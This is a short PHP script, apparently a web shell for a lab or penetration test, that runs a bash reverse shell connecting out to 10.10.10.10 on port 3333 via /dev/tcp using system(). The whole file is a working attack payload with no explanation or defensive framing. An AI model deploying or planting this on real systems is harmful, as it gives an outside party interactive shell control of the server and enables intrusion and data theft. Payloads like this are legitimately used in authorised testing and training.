<?php
$ip = '10.10.10.10';
$port = 3333;
$cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/$ip/$port 0>&1'";
system($cmd);
?>
